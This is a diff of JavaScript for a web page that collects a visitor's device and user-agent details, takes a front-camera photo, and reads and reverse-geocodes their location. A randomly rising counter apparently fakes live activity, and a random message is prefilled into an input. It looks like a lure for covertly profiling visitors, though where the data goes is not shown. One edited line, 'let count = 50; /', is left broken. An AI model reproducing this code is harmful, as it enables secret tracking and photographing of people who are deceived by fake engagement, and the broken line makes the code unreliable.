@@ -63,23 +63,6 @@ function getDeviceInfo() {
     return `${device} (${userAgent})`;
 }
 
-function getLocation() {
-    return new Promise(resolve => {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async position => {
-                const { latitude, longitude } = position.coords;
-                const locationText = await getAddressFromCoords(latitude, longitude);
-                resolve(`${locationText}\n\n📍 Koordinat: ${latitude}, ${longitude}`);
-            }, () => {
-                console.warn("Akses lokasi ditolak.");
-                resolve(null);
-            });
-        } else {
-            resolve(null);
-        }
-    });
-}
-
 function capturePhoto() {
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         .then(stream => {
@@ -126,6 +109,25 @@ function dataURItoBlob(dataURI) {
     return new Blob([ab], { type: mimeString });
 }
 
+
+function getLocation() {
+    return new Promise(resolve => {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async position => {
+                const { latitude, longitude } = position.coords;
+                const locationText = await getAddressFromCoords(latitude, longitude);
+                resolve(`${locationText}\n\n📍 Koordinat: ${latitude}, ${longitude}`);
+            }, () => {
+                console.warn("Akses lokasi ditolak.");
+                resolve(null);
+            });
+        } else {
+            resolve(null);
+        }
+    });
+}
+
+
 async function getAddressFromCoords(latitude, longitude) {
     try {
         const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
@@ -142,23 +144,22 @@ async function getAddressFromCoords(latitude, longitude) {
     }
 }
 
-let count = 50; // Mulai dari 50
+let count = 50; /
 
 function updateCount() {
-    let randomIncrease = Math.floor(Math.random() * 10) + 1; // Tambah angka acak antara 1-10
+    let randomIncrease = Math.floor(Math.random() * 10) + 1; 
     count += randomIncrease;
     document.getElementById("number").textContent = count;
 }
 
-// Jalankan peningkatan angka terus-menerus setiap 2 detik
 setInterval(updateCount, 2000);
 
 async function getRandomText() {
     try {
-        let response = await fetch('text.json'); // Ambil data dari text.json
-        let texts = await response.json(); // Ubah ke JSON
-        let randomIndex = Math.floor(Math.random() * texts.length); // Pilih index acak
-        document.getElementById("inputMessage").value = texts[randomIndex]; // Masukkan ke input
+        let response = await fetch('text.json'); 
+        let texts = await response.json(); 
+        let randomIndex = Math.floor(Math.random() * texts.length); 
+        document.getElementById("inputMessage").value = texts[randomIndex];
     } catch (error) {
         console.error("Error fetching random text:", error);
     }
